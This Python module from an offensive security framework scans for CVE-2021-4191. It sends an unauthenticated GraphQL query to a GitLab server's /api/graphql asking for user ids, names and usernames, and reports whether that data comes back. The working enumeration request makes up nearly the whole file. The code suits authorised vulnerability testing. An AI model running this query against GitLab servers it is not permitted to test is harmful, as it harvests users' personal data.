#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An unauthenticated remote attacker can leverage this vulnerability to collect registered GitLab usernames, nam."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'GitLab GraphQL API User Enumeration Detection',
        'description': 'An unauthenticated remote attacker can leverage this vulnerability to collect registered GitLab usernames, names, and email addresses.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'gitlab', 'api', 'graphql', 'enum', 'unauth', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.rapid7.com/blog/post/2022/03/03/cve-2021-4191-gitlab-graphql-api-user-enumeration-fixed/',
            'https://thehackernews.com/2022/03/new-security-vulnerability-affects.html',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-4191',
            'https://gitlab.com/gitlab-org/gitlab/-/issues/343898',
            'https://gitlab.com/gitlab-org/cves/-/blob/master/2021/CVE-2021-4191.json',
        ],
        'cve': 'CVE-2021-4191',
    }

    def run(self):
        path = '/api/graphql'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json', 'Accept': '*/*', 'Origin': '{{RootURL}}', 'Referer': '{{RootURL}}/-/graphql-explorer'}, data='{"query":"# Welcome to GraphiQL\\n#\\n# GraphiQL is an in-browser tool for writing, validating, and\\n# testing GraphQL queries.\\n#\\n# Type queries into this side of the screen, and you will see intelligent\\n# typeaheads aware of the current GraphQL type schema and live syntax and\\n# validation errors highlighted within the text.\\n#\\n# GraphQL queries typically start with a \\"{\\" character. Lines that starts\\n# with a # are ignored.\\n#\\n# An example GraphQL query might look like:\\n#\\n#     {\\n#       field(arg: \\"value\\") {\\n#         subField\\n#       }\\n#     }\\n#\\n# Keyboard shortcuts:\\n#\\n#  Prettify Query:  Shift-Ctrl-P (or press the prettify button above)\\n#\\n#       Run Query:  Ctrl-Enter (or press the play button above)\\n#\\n#   Auto Complete:  Ctrl-Space (or just start typing)\\n#\\n\\n{\\n  users {\\n    nodes {\\n      id\\n      name\\n      username\\n    }\\n  }\\n}","variables":null,"operationName":null}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"data"', '"users"', '"nodes"', '"id"', 'gid://',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='GitLab GraphQL API User Enumeration detected', path=path)
            return True
        return False

